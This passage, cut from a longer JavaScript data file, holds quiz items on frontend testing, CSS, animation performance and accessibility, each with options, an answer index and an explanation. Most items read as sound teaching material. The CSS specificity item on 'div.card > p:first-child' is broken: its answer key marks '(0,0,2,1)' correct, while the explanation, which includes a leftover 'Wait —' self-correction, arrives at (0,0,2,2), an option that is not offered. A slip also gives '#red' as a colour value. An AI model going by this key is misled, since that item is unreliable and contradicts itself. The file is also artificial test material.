    { q: "What should unit tests focus on?", opts: ["DOM structure", "Pure logic, utilities, and algorithms — things that don't depend on the DOM or React", "Component rendering", "API integration"], correct: 1, explain: "Unit tests excel for: pure functions, utility helpers, reducers, data transformations, and algorithms. They're fast and isolated. For UI components, integration tests (render + interact) provide more value." },
    { q: "When is an E2E test most valuable?", opts: ["For every component", "For critical user journeys (checkout, login, signup) where the cost of a production failure is high", "For unit test replacement", "For visual regression"], correct: 1, explain: "E2E tests are slow and fragile — use them sparingly for business-critical flows that must work end-to-end: login, payment, signup. They catch integration bugs that unit and integration tests miss but at a high maintenance cost." },
  ],

  'react-testing': [
    { q: "What is the core philosophy of React Testing Library?", opts: ["Test implementation details", "Test the way users interact with the component — query by text, label, role; not by class names or component state", "Test component rendering speed", "Test CSS styles"], correct: 1, explain: "RTL's guiding principle: 'The more your tests resemble the way your software is used, the more confidence they give you.' Query by role (getByRole), label (getByLabelText), text (getByText) — like a user would find elements." },
    { q: "Why should you avoid testing implementation details?", opts: ["It makes tests longer", "Tests coupled to internal state/component structure break when refactoring even if behavior is correct — false negatives", "React team says so", "It causes slower tests"], correct: 1, explain: "Testing that a React component has state.isOpen = false after clicking is testing implementation detail. If you refactor to use a different state structure, the test fails even though behavior is identical. Test behavior, not internals." },
    { q: "What is userEvent vs fireEvent in RTL?", opts: ["They are identical", "userEvent simulates real browser interactions (typing, clicking with proper event sequence); fireEvent triggers a single DOM event", "fireEvent is deprecated", "userEvent is slower but identical"], correct: 1, explain: "fireEvent.click dispatches one click event. userEvent.click simulates the full interaction: mousedown, mouseup, click, focus events in sequence — like a real user. userEvent.type simulates typing character by character with all keyboard events." },
    { q: "What does act() do in React testing?", opts: ["Acts like a spy function", "Wraps code that causes React state updates, ensuring all effects and updates are flushed before making assertions", "Mocks async operations", "Renders components"], correct: 1, explain: "act() ensures React updates are processed before assertions. RTL wraps most operations in act() automatically, but for async operations (fetch, timers), you may need to await act(async () => { ... }) to ensure state updates complete." },
  ],

  'mocking': [
    { q: "What is the difference between a mock, stub, and spy?", opts: ["They are the same", "Stub: returns fixed data; Spy: records calls while passing through; Mock: verifies interactions (more prescriptive than spy)", "Mock is for functions; stub for classes", "Spy is a Jest-specific term"], correct: 1, explain: "Stub: fake implementation returning test data. Spy: wraps real implementation, records calls/args (passthrough). Mock: pre-programmed with expectations about how it's called — test fails if expectations aren't met." },
    { q: "What is Mock Service Worker (MSW) used for?", opts: ["Mocking window.location", "Intercepting HTTP requests at the network level in tests and the browser — mock APIs without changing application code", "Creating fake WebSocket connections", "Mocking React components"], correct: 1, explain: "MSW intercepts fetch/XMLHttpRequest at the service worker level. Your app code doesn't change — the same code runs in tests and production. Define handlers once, use in Jest/Vitest tests AND in browser for development." },
    { q: "When should you mock vs when should you use the real implementation?", opts: ["Always mock external dependencies", "Mock: external APIs, databases, third-party services, non-deterministic things (Date, Math.random). Use real: pure functions, utilities you control, the code being tested", "Never mock in unit tests", "Mock everything for speed"], correct: 1, explain: "Mock what you don't control or what makes tests slow/non-deterministic. Keep real implementations for code you're testing and utilities that are fast and deterministic. Excessive mocking creates tests that don't test anything real." },
  ],
  // CSS ARCHITECTURE
  'css-specificity': [
    { q: "Which selector has the highest specificity?", opts: ["div p", "#header", ".nav a", "body div p span"], correct: 1, explain: "ID selectors (#header) have specificity of (0,1,0,0) — higher than classes (0,0,1,0) and elements (0,0,0,1). Only inline styles and !important beat IDs." },
    { q: "What does the CSS cascade determine?", opts: ["Animation speed", "Which styles apply when multiple rules target the same element", "DOM rendering order", "Script execution order"], correct: 1, explain: "The cascade resolves conflicts between CSS rules using: origin/importance, specificity, and source order. Later rules with equal specificity override earlier ones." },
    { q: "What is the specificity of 'div.card > p:first-child'?", opts: ["(0,0,1,2)", "(0,0,2,1)", "(0,1,0,1)", "(0,0,1,1)"], correct: 1, explain: "Count: 0 IDs, 2 classes/pseudo-classes (.card and :first-child), 2 elements (div and p) → (0,0,2,2). Wait — div.card is 1 class + 1 element, >p is 1 element, :first-child is 1 pseudo-class → (0,0,2,2)." },
    { q: "What does 'inherit' do as a CSS value?", opts: ["Resets to browser default", "Explicitly inherits the computed value from the parent element", "Makes the property important", "Copies from the next sibling"], correct: 1, explain: "inherit forces a property to take its parent's computed value, even for properties that don't normally inherit (like border, padding). Useful for making non-inherited properties follow the cascade." },
    { q: "What is the purpose of @layer in CSS?", opts: ["Creates animation layers", "Defines explicit cascade layers — lower layers lose to higher layers regardless of specificity", "Controls z-index stacking", "Groups media queries"], correct: 1, explain: "@layer defines named cascade layers. Rules in later layers always win over earlier layers, regardless of specificity. This solves the specificity war problem in large codebases and third-party style overrides." },
  ],

  'css-layout': [
    { q: "What is the difference between align-items and justify-content in Flexbox?", opts: ["They are identical", "justify-content aligns along the main axis; align-items aligns along the cross axis", "align-items is for Grid only", "justify-content is deprecated"], correct: 1, explain: "In Flexbox: justify-content controls alignment along the main axis (row direction by default). align-items controls alignment along the cross axis (column direction by default). They swap roles when flex-direction is column." },
    { q: "When should you use CSS Grid instead of Flexbox?", opts: ["Grid is always better", "Grid for two-dimensional layouts (rows AND columns simultaneously); Flexbox for one-dimensional layouts (row OR column)", "Flexbox is always better", "Use Grid only for image galleries"], correct: 1, explain: "Flexbox is one-dimensional — you control either a row or a column at a time. CSS Grid is two-dimensional — you control both rows and columns simultaneously. Use Grid when you need items to align in both axes." },
    { q: "What does 'fr' unit mean in CSS Grid?", opts: ["Font ratio", "A fractional unit representing a share of the available space in the grid", "Frame rate", "Fixed row height"], correct: 1, explain: "fr (fraction) represents a share of the remaining space. grid-template-columns: 1fr 2fr creates two columns where the second is twice the width of the first. Like flex-grow but for grid tracks." },
    { q: "What is the difference between auto-fill and auto-fit in grid-template-columns?", opts: ["They are identical", "auto-fill creates empty columns to fill space; auto-fit collapses empty columns making existing ones grow", "auto-fill is for rows only", "auto-fit requires fixed column widths"], correct: 1, explain: "Both create as many columns as fit. auto-fill preserves empty column tracks (they take space). auto-fit collapses empty tracks — remaining columns expand to fill the space. auto-fit is usually what you want for responsive grids." },
    { q: "What is 'subgrid' in CSS Grid?", opts: ["A smaller grid inside a larger one", "Allows a grid item's children to participate in the parent grid's track sizing", "A deprecated Grid feature", "CSS Grid level 2 specification only"], correct: 1, explain: "subgrid allows a grid item to adopt the parent grid's tracks for its own children. Without subgrid, a nested grid creates its own independent tracks. With subgrid, children align to the grandparent grid — perfect for card layouts where inner content should align across cards." },
  ],

  'css-bem': [
    { q: "In BEM, what does the double underscore (__) signify?", opts: ["A modifier", "An element — a child part of a block", "An important style", "A pseudo-element"], correct: 1, explain: "BEM: Block__Element--Modifier. Double underscore (__) indicates an Element — a child part of a Block. Example: .card__header, .card__body, .card__footer — these are elements of the .card block." },
    { q: "In BEM, what does the double hyphen (--) signify?", opts: ["An element", "A modifier — a variation or state of a block or element", "A child component", "A pseudo-class"], correct: 1, explain: "Double hyphen (--) indicates a Modifier — a variation or state. Example: .button--primary, .button--disabled, .card--featured. Modifiers describe how a block or element looks or behaves differently from the default." },
    { q: "What problem does BEM solve?", opts: ["CSS animation performance", "Naming collision and specificity wars in large codebases by creating a predictable, flat naming convention", "Browser compatibility", "Code splitting"], correct: 1, explain: "BEM creates a naming convention that makes CSS class names self-documenting and collision-free. By keeping selectors flat (one class), specificity stays low and predictable. You can always tell which component a class belongs to." },
  ],

  'css-variables': [
    { q: "How do you define a CSS custom property?", opts: ["$primary: #blue", "--primary-color: #3b82f6 (defined on a selector, usually :root)", "var(primary): #3b82f6", "@var --primary: #3b82f6"], correct: 1, explain: "CSS custom properties are defined with two hyphens: --property-name: value. Defined on :root for global access, or on any selector for scoped access. Used with var(--property-name)." },
    { q: "What is the key advantage of CSS custom properties over Sass variables?", opts: ["CSS variables are faster", "CSS variables are dynamic — they can be changed at runtime with JavaScript and respond to media queries", "CSS variables have better browser support", "Sass variables are deprecated"], correct: 1, explain: "Sass variables are compiled away at build time — they're static. CSS custom properties exist at runtime — you can change them with JS (element.style.setProperty('--color', 'red')), override in media queries, and inherit through the DOM." },
    { q: "Can CSS custom properties be changed with JavaScript?", opts: ["No — they are compile-time only", "Yes — element.style.setProperty('--name', value) changes the property at runtime", "Only in Chrome", "Only with !important"], correct: 1, explain: "Yes! element.style.setProperty('--color', '#red') updates the custom property at runtime. document.documentElement.style.setProperty('--theme', 'dark') changes a root variable affecting the whole page — the basis of runtime theming." },
  ],

  'css-in-js': [
    { q: "What is the main advantage of CSS Modules over global CSS?", opts: ["Better performance", "Locally scoped class names — generated unique names prevent style leakage and collisions", "Smaller bundle size", "Better animations"], correct: 1, explain: "CSS Modules transform class names to unique identifiers at build time (e.g., .button → .Button_button__abc123). Styles are scoped to the component file — no global namespace pollution or specificity battles." },
    { q: "What is the main performance concern with runtime CSS-in-JS (styled-components, Emotion)?", opts: ["Large file size", "Styles are generated and injected at runtime — adds JavaScript execution cost and can cause style recalculations during hydration", "Poor browser support", "No TypeScript support"], correct: 1, explain: "Runtime CSS-in-JS generates style tags dynamically in the browser. This means JS must run before styles are applied (FOUC risk), adds CPU cost for style generation, and can cause hydration mismatches in SSR. Zero-runtime alternatives (Linaria, vanilla-extract) solve this." },
    { q: "What is 'zero-runtime' CSS-in-JS?", opts: ["CSS-in-JS with no animations", "CSS extracted at build time to static CSS files — no runtime style injection, same DX as CSS-in-JS", "Inline styles only", "CSS-in-JS without TypeScript"], correct: 1, explain: "Zero-runtime CSS-in-JS (vanilla-extract, Linaria, Panda CSS) lets you write styles in TypeScript/JavaScript but extracts them to static CSS files at build time. You get type safety and component colocation without runtime overhead." },
  ],

  'css-container': [
    { q: "What is the key difference between container queries and media queries?", opts: ["Media queries are newer", "Container queries respond to the element's container size; media queries respond to the viewport size", "Container queries only work for images", "Media queries are deprecated"], correct: 1, explain: "Media queries check viewport size — the same component always looks the same at a given viewport width. Container queries check the component's container — the same component can look different depending on where it's placed (sidebar vs main content area)." },
    { q: "What CSS property do you need to define a containment context for container queries?", opts: ["container: true", "container-type: inline-size (or size)", "container-query: enabled", "display: container"], correct: 1, explain: "container-type: inline-size establishes an element as a containment context. Children can then use @container to query the container's width. container-type: size also considers height. Add container-name for named containers." },
    { q: "What does the CSS :has() selector do?", opts: ["Selects elements with a specific attribute", "Selects a parent based on its children — 'parent selector' that CSS lacked for decades", "Checks if a property has a value", "Validates form inputs"], correct: 1, explain: ":has() is the 'parent selector' — previously impossible in CSS. div:has(> img) selects divs that directly contain an img. form:has(:invalid) styles a form that contains invalid fields. Available in all modern browsers since 2023." },
  ],

  'css-perf': [
    { q: "What is 'critical CSS'?", opts: ["CSS with !important rules", "The minimum CSS needed to render above-the-fold content — inlined in <head> to eliminate render-blocking CSS request", "CSS for critical features only", "Minified production CSS"], correct: 1, explain: "Critical CSS extracts the styles needed for the initial viewport and inlines them in <head>. The full CSS file loads asynchronously after. This eliminates the render-blocking CSS request, dramatically improving First Contentful Paint." },
    { q: "What does 'content-visibility: auto' do?", opts: ["Hides content until visible", "Skips rendering off-screen content — browser skips layout and paint until element is near the viewport", "Lazy loads images", "Defers JavaScript execution"], correct: 1, explain: "content-visibility: auto tells the browser to skip layout, paint, and compositing for off-screen elements. This is essentially browser-native virtualization for static content — rendering time can improve dramatically for long documents." },
    { q: "What is will-change and when should you use it?", opts: ["Always — it improves all animations", "Hints browser to pre-optimize an element for upcoming changes (creates GPU layer). Use sparingly — only when you KNOW animation is about to happen", "It forces GPU acceleration permanently", "Only for opacity animations"], correct: 1, explain: "will-change: transform hints to the browser to create a compositor layer in advance. This avoids layer promotion happening mid-animation (which causes a brief jank). Use sparingly — too many layers waste GPU memory and can actually hurt performance." },
  ],

  'css-dark-mode': [
    { q: "What CSS media feature detects the user's system dark mode preference?", opts: ["@media (dark-mode: true)", "@media (prefers-color-scheme: dark)", "@media (theme: dark)", "@media (color-scheme: dark)"], correct: 1, explain: "prefers-color-scheme: dark detects if the user's OS is in dark mode. prefers-color-scheme: light for light mode. Use with CSS custom properties to swap color tokens — no JavaScript needed for CSS-based dark mode." },
    { q: "What is the recommended CSS architecture for implementing dark mode?", opts: ["Duplicate all CSS rules with dark variants", "Define color tokens as CSS custom properties on :root, override them in a dark mode selector or media query", "Use JavaScript to toggle inline styles", "Use separate CSS files for dark and light modes"], correct: 1, explain: "Define semantic color tokens: --color-bg: white; --color-text: black. In @media (prefers-color-scheme: dark): override with --color-bg: #0d1117. Components use var(--color-bg) — they automatically adapt. One set of component styles, two sets of tokens." },
    { q: "How do you support both system preference AND manual toggle for dark mode?", opts: ["You can only support one at a time", "Use data-theme attribute on <html> overridden by JS for manual, fallback to media query", "Use localStorage only", "Only media queries work for dark mode"], correct: 1, explain: ":root { --bg: white } @media (prefers-color-scheme: dark) { :root { --bg: #111 } } [data-theme='dark'] { --bg: #111 } [data-theme='light'] { --bg: white }. JS sets data-theme to override the media query. No theme attribute = follows system preference." },
  ],

  // ANIMATIONS
  'css-transitions': [
    { q: "What is the key difference between CSS transition and CSS animation?", opts: ["Animations are faster", "Transitions animate between two states triggered by an event; animations use @keyframes and can loop, play automatically, run complex sequences", "Transitions are deprecated", "Animations can't animate transform"], correct: 1, explain: "Transitions: simple A→B animation triggered by state change (hover, class change). Animations: full @keyframes sequences with multiple steps, delays, iteration counts, play states — can start automatically without a trigger." },
    { q: "What does 'ease-in-out' timing function do?", opts: ["Starts fast, ends fast", "Starts slow, speeds up in the middle, then slows down at the end — most natural feeling", "Constant speed throughout", "Jumps to end instantly"], correct: 1, explain: "ease-in-out: starts slowly (ease-in), accelerates through the middle, then decelerates at the end (ease-out). Mimics natural motion with momentum. Most animations feel natural with ease-in-out." },
    { q: "What does 'transition-delay' do?", opts: ["Slows down the animation", "Waits N seconds before starting the transition", "Sets the animation duration", "Pauses mid-animation"], correct: 1, explain: "transition-delay waits before starting the transition. Useful for staggering multiple transitions: .item:nth-child(2) { transition-delay: 0.1s } .item:nth-child(3) { transition-delay: 0.2s } creates a cascade effect." },
    { q: "Which properties are cheapest to animate for performance?", opts: ["width, height, margin, padding", "transform (translate, scale, rotate) and opacity — handled by GPU compositor without triggering layout or paint", "color and background-color", "font-size and letter-spacing"], correct: 1, explain: "transform and opacity changes are handled entirely by the compositor thread — no layout, no paint. All other property animations trigger at least repaint (color) or full reflow (width/height). Always prefer transform over top/left for movement." },
  ],

  'gpu-acceleration': [
    { q: "What triggers promotion to a GPU compositor layer?", opts: ["Any CSS animation", "transform, opacity, will-change — elements with these properties are promoted to their own GPU layer", "display: block", "z-index: 999"], correct: 1, explain: "Browsers promote elements to compositor layers for: CSS transforms, opacity, will-change, video elements, canvas, and position:fixed. Compositor layers are painted once and composited by GPU — perfect for smooth animations." },
    { q: "What is the rendering pipeline order?", opts: ["Paint → Layout → Composite", "JavaScript → Style → Layout → Paint → Composite", "DOM → Paint → Display", "Style → DOM → Composite"], correct: 1, explain: "JavaScript → Style calculation → Layout (reflow) → Paint → Composite. Shortcutting this pipeline is the key to performance: transform/opacity skip to Composite (fastest), color/background skip Layout (medium), width/height go through full pipeline (slowest)." },
    { q: "What is 'layout thrashing' and how do you fix it?", opts: ["Too many CSS classes", "Reading layout properties (offsetWidth) then writing styles in a loop — forces N synchronous reflows. Fix: batch all reads then all writes", "Animating too many elements", "Using too many GPU layers"], correct: 1, explain: "Layout thrashing: read offsetWidth (forces reflow) → write style (invalidates layout) → read again (forces another reflow) in a loop. Fix: read all properties first, then apply all changes. Or use requestAnimationFrame to batch DOM writes." },
    { q: "What does will-change: transform do?", opts: ["Permanently speeds up the element", "Hints to the browser to promote the element to a GPU layer BEFORE animation starts — preventing mid-animation jank", "Forces hardware acceleration always", "Only works for 3D transforms"], correct: 1, explain: "will-change hints that transformation is coming. The browser pre-creates the compositor layer. Without it, layer promotion happens at animation start — causing a brief jank. Remove will-change after animation to free GPU memory." },
  ],

  'animation-perf': [
    { q: "What frame rate target should smooth animations hit?", opts: ["30fps", "60fps (16.6ms per frame)", "120fps", "24fps (film standard)"], correct: 1, explain: "60fps = 16.6ms per frame. The browser must complete all rendering work (JS, style, layout, paint, composite) within 16.6ms to maintain smooth animation. Long tasks over 50ms cause 'jank' — visible stuttering." },
    { q: "What Chrome DevTools panel shows animation frame performance?", opts: ["Network panel", "Performance panel — flame chart shows frame timing, long tasks, layout/paint costs", "Application panel", "Memory panel"], correct: 1, explain: "The Performance panel records frame-by-frame execution. Frames in green = smooth (under 16ms). Frames in red = janky (over 16ms). The flame chart shows exactly what ran during each frame — JS, style recalc, layout, paint, composite." },
    { q: "What is requestAnimationFrame used for?", opts: ["Loading animations lazily", "Scheduling JS to run before the next browser repaint — ensures animation code runs once per frame, synchronized with display refresh", "Creating CSS animations with JavaScript", "Delaying animations"], correct: 1, explain: "requestAnimationFrame(callback) calls your callback just before the browser's next paint — typically 60 times per second. This synchronizes JS animations with the display refresh rate and avoids running when the tab is hidden (saves battery)." },
  ],

  'css-keyframes': [
    { q: "What does 'animation-fill-mode: forwards' do?", opts: ["Loops the animation forward", "The element retains the styles from the last keyframe after animation ends — doesn't snap back to original", "Plays animation in forward direction", "Fills the element with color"], correct: 1, explain: "animation-fill-mode: forwards keeps the final keyframe styles applied after the animation completes. Without it, elements snap back to their original state. Use forwards for one-shot animations where you want the final state to persist." },
    { q: "What does 'animation-iteration-count: infinite' do?", opts: ["Plays animation 100 times", "Loops the animation forever", "Plays until user interaction", "Plays for 1 second"], correct: 1, explain: "animation-iteration-count: infinite loops the animation endlessly. For looping animations like spinners, pulses, or bouncing indicators. Combine with animation-direction: alternate to smoothly reverse direction on each iteration." },
    { q: "How do you stagger multiple element animations?", opts: ["Use animation-stagger property", "Give each element a different animation-delay — nth-child selectors make this easy", "Use JavaScript only", "animation-stagger doesn't exist in CSS"], correct: 1, explain: "CSS has no built-in stagger. Use nth-child or custom properties: .item:nth-child(1) { animation-delay: 0s } .item:nth-child(2) { animation-delay: 0.1s }. Or set --delay via JavaScript and reference it: animation-delay: var(--delay)." },
  ],

  'web-animations': [
    { q: "What is the Web Animations API?", opts: ["A JavaScript library", "A native browser API (element.animate()) for creating and controlling animations with JavaScript — more powerful than CSS animations", "A React animation library", "CSS animations accessed via JavaScript"], correct: 1, explain: "Web Animations API: element.animate(keyframes, options) creates animations programmatically. Returns an Animation object you can play(), pause(), reverse(), cancel(). Gives precise JS control while using the browser's native animation engine (GPU accelerated)." },
    { q: "What does element.animate() return?", opts: ["A Promise", "An Animation object with play(), pause(), cancel(), reverse() methods and a finished Promise", "A CSS animation string", "undefined"], correct: 1, explain: "element.animate() returns an Animation object. Call .play() to start, .pause(), .cancel(), .reverse(). The .finished Promise resolves when the animation completes. Check .playState to see 'running', 'paused', 'finished', or 'idle'." },
  ],

  'layout-shift': [
    { q: "What is Cumulative Layout Shift (CLS)?", opts: ["How fast the page loads", "A Core Web Vital measuring visual stability — how much content unexpectedly shifts position during page load", "The total amount of CSS", "Animation performance metric"], correct: 1, explain: "CLS measures unexpected visual shifts — content jumping around as images load, ads inject, or fonts swap. Target: below 0.1. Each shift is: (impact fraction × distance fraction). Multiple shifts accumulate." },
    { q: "What is the most common cause of high CLS?", opts: ["Too many animations", "Images without explicit width/height — browser doesn't know space to reserve until image loads, causing a shift", "Large JavaScript files", "Slow server response"], correct: 1, explain: "Images without dimensions are the #1 CLS cause. Browser renders text, image loads and pushes text down — that's layout shift. Fix: always set width and height on img elements. aspect-ratio CSS property also works." },
    { q: "How do web fonts cause layout shift?", opts: ["They don't affect layout", "Flash of Unstyled Text (FOUT) — fallback font renders at different size than web font, causing text reflow when web font loads", "Web fonts are always cached", "Fonts only affect color"], correct: 1, explain: "FOUT: browser renders text with fallback font (different metrics), web font loads, text re-renders at different size/spacing — layout shifts. Fix: font-display: swap with size-adjust to match fallback metrics, or font-display: optional to skip if not cached." },
    { q: "What CSS property reserves space for dynamic content to prevent CLS?", opts: ["overflow: hidden", "min-height or aspect-ratio — reserve space before content loads so insertion doesn't push other content", "position: absolute", "content-visibility: auto"], correct: 1, explain: "Set min-height on containers that will have dynamic content (ads, embeds, async content). If you know the aspect ratio (16:9 video), use aspect-ratio: 16/9. This reserves space in the layout so content loading doesn't shift surrounding elements." },
  ],

  'framer-motion': [
    { q: "What is AnimatePresence in Framer Motion used for?", opts: ["Making animations faster", "Enabling exit animations — components can animate out before being removed from the DOM", "A required wrapper for all animations", "Server-side rendering support"], correct: 1, explain: "Normally when React removes a component, it disappears instantly. AnimatePresence wraps components and delays their removal, allowing exit animations defined in the exit prop to play first. Essential for page transitions and dismissible modals." },
    { q: "What is the 'layout' prop in Framer Motion?", opts: ["Sets the CSS layout", "Automatically animates layout changes — when element size or position changes, it smoothly transitions instead of jumping", "Required for grid layouts", "Defines the animation direction"], correct: 1, explain: "layout prop enables Framer Motion's layout animations. When an element's position or size changes (due to sibling addition/removal, reorder), Framer Motion automatically creates a smooth FLIP animation. Combine with layoutId for shared element transitions." },
  ],

  // ACCESSIBILITY
  'a11y-semantics': [
    { q: "Why is semantic HTML important for accessibility?", opts: ["It loads faster", "Screen readers and assistive technologies use semantic meaning to convey structure and purpose to users — a <nav> announces navigation, a <button> announces it's clickable", "It looks better visually", "It's required by law"], correct: 1, explain: "Semantic HTML communicates meaning to assistive technologies. <header> announces a page header, <nav> a navigation region, <main> the primary content, <button> an interactive control. Screen readers use these to help users navigate and understand the page." },
    { q: "When should you use ARIA attributes?", opts: ["Always — ARIA improves all accessibility", "Only when native HTML semantics can't convey the needed meaning — the first rule of ARIA is don't use ARIA if native HTML works", "Never — ARIA is deprecated", "Only for custom components"], correct: 1, explain: "The first rule of ARIA: no ARIA is better than bad ARIA. Use native HTML semantics first (<button>, <nav>, <header>). Only use ARIA when creating custom widgets that have no HTML equivalent (custom slider, combobox, tree view)." },
    { q: "What is the difference between aria-label and aria-labelledby?", opts: ["They are identical", "aria-label provides a string label directly; aria-labelledby references another element's text as the label by ID", "aria-labelledby is deprecated", "aria-label only works on inputs"], correct: 1, explain: "aria-label='Close dialog' adds an invisible label string. aria-labelledby='heading-id' references visible text elsewhere — the screen reader reads that element's text as the label. aria-labelledby is preferred when visible label text exists." },
    { q: "What is role='button' vs using a <button> element?", opts: ["They are equivalent", "<button> is always preferred — it has built-in keyboard support, focus, type, and semantics. role='button' on a div requires manually adding all that behavior", "role='button' is better for custom styling", "They differ only visually"], correct: 1, explain: "A real <button> element gives you: keyboard focus, Enter/Space activation, disabled state, form integration, and screen reader semantics for free. A div with role='button' requires manually adding tabIndex='0', onKeyDown handlers for Enter/Space, and all other behaviors." },
    { q: "What are landmark roles and why do they matter?", opts: ["CSS positioning roles", "ARIA roles (main, nav, header, aside, footer) that define page regions — screen reader users can jump between landmarks to navigate quickly", "JavaScript event roles", "Performance optimization roles"], correct: 1, explain: "Landmark roles (banner, navigation, main, complementary, contentinfo, search, form, region) divide the page into navigable sections. Screen reader users press a key to list/jump between landmarks — like a table of contents. Use native HTML elements which map to landmarks automatically." },
  ],

  'a11y-keyboard': [
    { q: "What is focus trapping and when is it needed?", opts: ["Preventing users from typing", "Keeping keyboard focus inside a modal/dialog until dismissed — prevents users from tabbing into background content", "Disabling the Tab key", "Focusing on the first element"], correct: 1, explain: "Focus trapping keeps Tab cycling within a modal dialog. Without it, keyboard users can Tab into background content while the modal is open — confusing and inaccessible. Required for: modal dialogs, drawers, date pickers. Release focus when dialog closes." },
    { q: "What is a 'skip navigation' link?", opts: ["A link to skip the entire page", "A visually hidden link at the top of the page that lets keyboard users skip directly to main content, bypassing repetitive navigation", "A mobile-only feature", "An ARIA role"], correct: 1, explain: "Skip nav links appear first in DOM. Screen reader/keyboard users can Tab to them and press Enter to jump directly to #main-content, bypassing the navigation menu. Without it, keyboard users must Tab through every nav link on every page load." },
    { q: "What tabIndex value makes an element programmatically focusable but removes it from tab order?", opts: ["tabIndex='1'", "tabIndex='-1' — programmatically focusable via focus() but not in natural Tab order", "tabIndex='0'", "tabIndex='false'"], correct: 1, explain: "tabIndex='-1': programmatically focusable (element.focus() works) but not in tab order. Use for: modal containers (focus them on open), skip targets. tabIndex='0': adds to natural tab order at position in DOM. Avoid tabIndex > 0 — creates confusing tab order." },
    { q: "How should keyboard interactions work for a custom dropdown menu?", opts: ["Mouse only is acceptable", "Arrow keys navigate options, Enter/Space select, Escape closes, Tab moves to next interactive element outside the menu", "Click events handle everything", "Only Tab key is needed"], correct: 1, explain: "ARIA APG patterns: ArrowDown/Up navigate options, Enter/Space select, Escape closes (returns focus to trigger), Home/End jump to first/last, type-ahead filtering. This matches user expectations from native OS dropdowns." },
  ],

  'a11y-screen-reader': [
    { q: "What is aria-live and when should you use it?", opts: ["For live video content", "Announces dynamic content changes to screen readers — use for status messages, errors, notifications that appear without focus change", "Required for all updates", "Only for chat applications"], correct: 1, explain: "aria-live='polite' announces content changes when the user is idle. aria-live='assertive' interrupts immediately (use sparingly — only for critical errors). Use for: form validation errors, success messages, search results count, loading complete notifications." },
    { q: "What does a screen reader announce when encountering a <button>?", opts: ["Nothing special", "The button text, 'button' role, and state (disabled, pressed, expanded) — e.g., 'Submit, button' or 'Menu, button, collapsed'", "Only the button text", "Button HTML attributes"], correct: 1, explain: "Screen readers announce: accessible name (text content or aria-label) + role ('button') + state (disabled, aria-pressed, aria-expanded). A button reading 'Submit, button' tells the user both what it says and that it's interactive." },
    { q: "What is the accessible name of an icon button with no text?", opts: ["The icon itself", "Nothing — it has no accessible name (accessibility failure)", "The button element name", "The class name"], correct: 1, explain: "An icon-only button (<button><svg>...</svg></button>) has no accessible name — screen readers may announce 'button' with no description. Fix: add aria-label='Close dialog' or a visually hidden <span className='sr-only'>Close</span>." },
  ],

  'a11y-color': [
    { q: "What is the WCAG AA minimum contrast ratio for normal text?", opts: ["2:1", "3:1", "4.5:1", "7:1"], correct: 2, explain: "WCAG AA requires 4.5:1 contrast for normal text (< 18pt or 14pt bold) against background. Large text (18pt+ or 14pt+ bold) requires 3:1. WCAG AAA requires 7:1 for normal, 4.5:1 for large. Test with browser extensions or Lighthouse." },
    { q: "Why is it insufficient to use color alone to convey information?", opts: ["Color is always clear", "Approximately 8% of men have color vision deficiency — they can't distinguish red from green. Provide text labels, patterns, or icons in addition to color", "Colors fade over time", "Accessibility guidelines don't cover color"], correct: 1, explain: "Color blindness affects ~8% of males. Red/green confusion is most common — 'success (green) / error (red)' without icons or text is inaccessible. Always pair color with text, icons, or patterns. This also helps in high-contrast mode and monochrome displays." },
    { q: "What does 'forced colors mode' (Windows High Contrast) do?", opts: ["Makes everything black and white", "Overrides all author colors with user-defined high-contrast palette — CSS backgrounds/colors are replaced", "Increases font size", "Disables animations"], correct: 1, explain: "Windows High Contrast Mode (now 'Forced Colors') replaces author CSS colors with a user-chosen high-contrast palette. Background images are removed. Test with @media (forced-colors: active) to ensure UI is still usable without custom colors." },
  ],

  'a11y-forms': [
    { q: "Why must every form input have an associated label?", opts: ["For CSS styling", "Screen readers announce the label when the input is focused — without it, users don't know what to type. Click area is also larger with labels", "HTML validation requirement", "For placeholder text"], correct: 1, explain: "Labels: 1) Tell screen reader users what a field is for, 2) Increase click target (clicking label focuses input), 3) Are required for WCAG compliance. Use <label for='id'> or wrap input inside label. Never use placeholder as the only label." },
    { q: "What is the problem with using placeholder text as a label?", opts: ["Placeholders look bad", "Placeholders disappear when typing, have poor color contrast, aren't reliably announced by screen readers, and don't persist for review", "Placeholders require JavaScript", "Placeholders can't be styled"], correct: 1, explain: "Placeholder problems: disappears on type (users forget what field is for), fails contrast requirements (WCAG requires 4.5:1 — placeholders are typically gray), not consistently announced by screen readers as the field label. Always use a real <label> element." },
    { q: "How should form validation errors be associated with inputs?", opts: ["Just change the border color to red", "Use aria-describedby to link error message to input, aria-invalid='true' on input, and make errors visible in text (not just color)", "Use title attribute", "Validation errors don't need accessibility consideration"], correct: 1, explain: "Accessible error pattern: 1) aria-invalid='true' on input (announces 'invalid' state), 2) aria-describedby='error-id' linking input to error text, 3) Error text visible (not just color change), 4) Focus management to error or use aria-live to announce it." },
  ],

  'a11y-images': [
    { q: "What is the correct alt text for a decorative image?", opts: ["alt='decorative'", "alt='' (empty string) — tells screen readers to skip it entirely", "Remove the alt attribute", "alt='image'"], correct: 1, explain: "Decorative images (spacers, design elements that add no information) should have alt='' — empty string. This tells screen readers to skip it completely. Don't write 'decorative' or 'image' — that's worse than empty. Removing alt entirely makes screen readers read the filename." },
    { q: "What should alt text describe?", opts: ["The file name", "The purpose/meaning/content of the image in context — what a sighted user gets from it that would be lost without the image", "Always 'image of...'", "Technical image properties"], correct: 1, explain: "Good alt text conveys what information the image provides to the page content, not what the image literally shows. A chart showing Q3 revenue: alt='Bar chart showing Q3 revenue of $2.3M, up 15% from Q2'. A CEO photo: alt='Jane Smith, CEO of ExampleCorp'." },
    { q: "What alt text should an image used as a link button have?", opts: ["alt='' because it's decorative in context of the link", "Alt text describing the link destination/action — not the image itself", "alt='link'", "Alt text describing the image literally"], correct: 1, explain: "When an image is the only content of a link, the alt text is the link label. <a href='/home'><img src='logo.svg' alt='ExampleCorp homepage'></a> — describes where the link goes. 'Logo' alone is insufficient — users don't know it's a home link." },
  ],

  'a11y-testing': [
    { q: "What percentage of accessibility issues can automated tools (like axe) catch?", opts: ["100%", "30-40% — the rest require human judgment and manual testing", "80%", "10%"], correct: 1, explain: "Automated tools catch ~30-40% of WCAG issues — mainly structural problems (missing alt text, low contrast, missing labels). They can't test: keyboard navigation flow, screen reader announcement quality, logical reading order, or cognitive clarity. Always combine automated + manual testing." },
